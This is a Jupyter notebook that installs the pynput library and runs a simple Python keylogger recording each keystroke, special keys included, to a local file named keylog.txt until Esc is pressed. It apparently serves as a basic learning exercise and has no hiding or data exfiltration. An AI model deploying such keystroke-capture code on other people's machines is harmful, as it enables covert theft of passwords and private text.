{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cbf36710-5b3b-4829-8139-356d8029d1f2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pynput in c:\\users\\hp\\anaconda3\\lib\\site-packages (1.8.1)\n",
      "Requirement already satisfied: six in c:\\users\\hp\\anaconda3\\lib\\site-packages (from pynput) (1.16.0)\n"
     ]
    }
   ],
   "source": [
    "!pip install pynput\n",
    "\n",
    "from pynput import keyboard\n",
    "\n",
    "# File to save the logged keystrokes\n",
    "log_file = \"keylog.txt\"\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        # Write the character pressed to the file\n",
    "        with open(log_file, \"a\") as f:\n",
    "            f.write(key.char)\n",
    "    except AttributeError:\n",
    "        # Handle special keys (e.g., space, enter, shift)\n",
    "        with open(log_file, \"a\") as f:\n",
    "            if key == keyboard.Key.space:\n",
    "                f.write(\" \")\n",
    "            elif key == keyboard.Key.enter:\n",
    "                f.write(\"\\n\")\n",
    "            else:\n",
    "                f.write(f\" [{key.name}] \")\n",
    "\n",
    "def on_release(key):\n",
    "    # Stop listener with Esc key\n",
    "    if key == keyboard.Key.esc:\n",
    "        return False\n",
    "\n",
    "with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5aad1b99-4f1e-484f-a377-c2448008441b",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [conda env:base] *",
   "language": "python",
   "name": "conda-base-py"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
